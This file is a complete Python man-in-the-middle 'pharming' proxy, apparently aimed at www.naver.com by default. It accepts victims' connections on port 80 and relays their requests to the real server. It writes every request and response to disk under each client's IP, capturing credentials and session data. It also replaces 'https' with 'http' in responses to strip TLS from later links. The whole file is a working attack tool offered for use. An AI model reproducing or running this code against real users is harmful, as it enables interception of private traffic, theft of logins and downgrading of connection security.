from socket import *
import ssl
import threading
import os
import argparse
import time

PORT = 80
MAX_CLIENT = 1
MAX_DATA_LEN = 1024
SERVER_NAME = "www.naver.com"
DIR_NAME = None
TIME = None
HTTP = False


def get_args():
    parser = argparse.ArgumentParser(description="Let's pharming!")
    parser.add_argument("--server", help="target server")
    parser.add_argument("--port", help="target port")
    parser.add_argument("--http", action="store_const", const=True, help="using http with server")

    parser = parser.parse_args()

    return parser

def init():
    global DIR_NAME, TIME

    TIME = time.strftime("%Y-%m-%d %H.%M.%S")

    DIR_NAME = f"./pharming/{SERVER_NAME}..{PORT}"
    if not os.path.isdir("./pharming"): os.mkdir("./pharming")
    if not os.path.isdir(DIR_NAME): os.mkdir(DIR_NAME)
    os.mkdir(f"{DIR_NAME}/{TIME}")
    # if not os.path.isdir(f"{DIR_NAME}/{TIME}/client_to_server"): os.mkdir(f"{DIR_NAME}/{TIME}/client_to_server")
    # if not os.path.isdir(f"{DIR_NAME}/{TIME}/server_to_client"): os.mkdir(f"{DIR_NAME}/{TIME}/server_to_client")

def init_sock():
    serverSock = socket(AF_INET, SOCK_STREAM)
    serverSock.bind(('', PORT))
    serverSock.listen(MAX_CLIENT)
    return serverSock

def init_ssl():
    return ssl.create_default_context()

def init_save(addr):
    if not os.path.isdir(f"{DIR_NAME}/{TIME}/{addr}"): os.mkdir(f"{DIR_NAME}/{TIME}/{addr}")

def get_sock():
    clientSock, addr = serverSock.accept()
    print("\n[+] Connected by", addr)
    return clientSock, addr[0]

def just_recv(sock):
    data = b""
    while (1):
        msg = sock.recv(MAX_DATA_LEN)
        data += msg

        if len(msg) != MAX_DATA_LEN:
            break

    return data

def just_send(sock, data):
    return sock.send(data)

def request_from_client(clientSock):
    time.sleep(0.2)
    data = just_recv(clientSock)
    print("[CLIENT -> MITM]", len(data))
    return data

#https://docs.python.org/ko/3/library/ssl.html
def request_to_server(data, ssl_context: ssl.SSLContext):
    ret = None

    if HTTP:
        with create_connection((SERVER_NAME, 80)) as sock:

            try:
                print("[MITM -> SERVER]", just_send(sock, data))

                time.sleep(0.2)
                ret = just_recv(sock)

                print("[MITM <- SERVER]", len(ret))
            except: pass

    else:
        with create_connection((SERVER_NAME, 443)) as sock:
            with ssl_context.wrap_socket(sock, server_hostname=SERVER_NAME) as ssock:
                try:
                    print("[MITM -> SERVER]", just_send(ssock, data))

                    time.sleep(0.2)
                    ret = just_recv(ssock)

                    print("[MITM <- SERVER]", len(ret))
                except: pass

    return ret

def response_to_client(clientSock, data):
    print("[CLIENT <- MITM]", len(data))
    return just_send(clientSock, data)

def save(addr, type, data):
    with open(f"{DIR_NAME}/{TIME}/{addr}/{time.strftime('%Y-%m-%d %H.%M.%S')}.{(lambda x:x[x.index('.')+1:])(str(time.time()))}_{type}", "wb") as f:
        f.write(data)

def pharming_client(clientSock, addr):

    init_save(addr)

    req = request_from_client(clientSock)
    save(addr, "request", req)

    res = request_to_server(req, ssl_context)
    save(addr, "response", res)

    res = res.replace(b"https", b"http")

    response_to_client(clientSock, res)

    clientSock.close()


args = get_args()
if args.server: SERVER_NAME = args.server
if args.port: PORT = args.port
if args.http: HTTP = args.http

init()
serverSock = init_sock()
ssl_context = init_ssl()

print("[+] target_server:", SERVER_NAME)
print("[+] target_port:", PORT)
print("[+] using_http:", HTTP)
print("[+] time:", TIME)

print("\n[+] Successfully initialized")

try:
    while (1):

        clientSock, addr = get_sock()

        threading.Thread(target=pharming_client, args=(clientSock, addr)).start()

except Exception as e:
    print("Error:", e)
except KeyboardInterrupt:
    print("\nEXIT")

try:
    serverSock.close()
    clientSock.close()
except: pass
